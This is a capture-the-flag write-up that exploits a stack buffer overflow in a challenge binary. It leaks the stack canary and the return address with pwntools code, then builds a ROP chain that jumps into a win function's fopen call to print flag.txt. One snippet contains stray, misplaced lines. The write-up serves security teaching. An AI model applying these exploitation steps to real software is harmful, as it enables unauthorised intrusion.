   The challenge binary has only a few functions. In the ~main~ function not much happens besides ~getFeedback~ getting called in a ~while(true)~ loop:

   [[file:data/01/6f2d9c-2fde-478c-bb03-5f140e01edca/screenshot-20230116-135923.png]]

   The interesting parts are in the ~getFeedback~ function:

   [[file:data/01/6f2d9c-2fde-478c-bb03-5f140e01edca/screenshot-20230116-140358.png]]

   In both read functions there is a buffer overflow. However as we can see at the end of the function, the binary also uses stack canaries.
   So we can't just overflow the buffer to overwrite the return address because the ~__stack_chk_fail()~ check would fail.

*** Canary leak
    :PROPERTIES:
    :ID:       f1e4da43-eb15-4633-84cb-dac644906a77
    :END:
    To overflow the buffer without crashing the process we first need to leak the canary. Luckily, we can use the first
    ~read()~ call followed by the ~printf()~ call to leak the canary, then write the correct canary back using the second ~read()~ call.

    [[file:data/f1/e4da43-eb15-4633-84cb-dac644906a77/screenshot-20230116-142422.png]]

    In this case the canary is ~0x4f4bde881e0f0f00~ and comes directly after the input buffer. On Linux a stack canary always starts with a NULL byte.
    Since ~printf()~ always prints up to the next NULL byte we simply have to overflow the buffer by one byte to overwrite the NULL byte to print the
    stack canary followed by the ~rbp~ up to the next NULL byte.

    The following code snippet does exactly that:
    #+begin_src python
    r.recvuntil(b"Do you want to complete a survey?")
    r.sendline(b"y")
    r.recvuntil("Do you like ctf?\n")
    r.sendline(b'a'*offset_to_canary)
    r.recvline() # recv input to new line
    leak = r.recvline()
    canary = int.from_bytes(b'\x00' + leak[:7], 'little')
    rbp = int.from_bytes(leak[7:13], 'little')
    print(f'rbp:          {hex(rbp)}')
    print(f'canary:       {hex(canary)}')

        r = process([exe.path])
    return r
    #+end_src

    After the overflow the stack looks like this:

    [[file:data/f1/e4da43-eb15-4633-84cb-dac644906a77/screenshot-20230116-143231.png]]

    Now that we know the canary, we can use the second ~read()~ call to write it back to the stack.

    #+begin_src python
    r.recvuntil(b'Aww :( Can you provide some extra feedback?')
    r.sendline(b'a' * offset_to_canary + p64(canary))
    #+end_src

    When the ~getFeedback~ function gets called the second time we can use the information leak to leak the return address from
    the stack which points to the main function. From this point, the offset to the base address
    of the binary can be calculated which we can use to build our ROP chain.

    #+begin_src python
    r.recvuntil(b"Do you want to complete a survey?")
    r.sendline(b"y")
    r.recvuntil("Do you like ctf?\n")
    # leak return address to main
    r.sendline(b'a' * offset_to_ret)
    r.recvline() # recv input to new line
    ret_leak = int.from_bytes(r.recvline()[:6], 'little')
    # set base address
    exe.address = ret_leak - 0x1447
    #+end_src

    From here we could try to leak a libc address to ret2libc. In this case however, the binary contains a ~win~ function we can use
    which reads a file and prints its content:

    [[file:data/f1/e4da43-eb15-4633-84cb-dac644906a77/screenshot-20230116-150202.png]]

    Unfortunately, just overwriting the return address with the win address wont work since the ~win~ function takes 3 characters of the
    filename as parameters. The parameters are passed via the registers ~rdi~, ~rsi~ and ~rdx~. The registers ~rsi~ and ~rdi~ can be set
    by using simple ROP gadgets. For ~rdx~ however I did not find any useful gadgets.

    So instead of calling the entry point of the ~win~ function we can also call it with an offset to the point where ~fopen~ gets called.
    Therefore, we have to set the parameters for ~fopen~ befor jumping there. ~fopen~ takes a pointer to the filename and a pointer to a string containing
    the mode. Since we only need 2 parameters which get passed via ~rdi~ and ~rsi~ we can achieve this using our already found gadgets:

    #+begin_src python
    fopen = p64(exe.address + 0x12ba)
    pop_rdi = p64(exe.address + 0x14d3)
    pop_rsi_r15 = p64(exe.address + 0x14d1)
    read_mode_str = p64(exe.address + 0x2008)
    r.sendline(b'a' * offset_to_canary + p64(canary)
               # Overwrite rbp
               # Set offset big enough so fgets does not fuck up the stack
               + p64(rbp - 0x100)
               # ROP Chain:
               # pop pointer to 'flag.txt' string into rdi
               + pop_rdi + p64(rbp+0x28)
               # pop pointer to 'r' string into rsi
               + pop_rsi_r15 + read_mode_str + p64(0xdeadbeef)
               # return directly to fopen call in win function
               + fopen
               # filename string which will be used for fopen
               + b'flag.txt\x00\x00')
    #+end_src

    This will read the flag from the ~flag.txt~ file and print it to stdout.
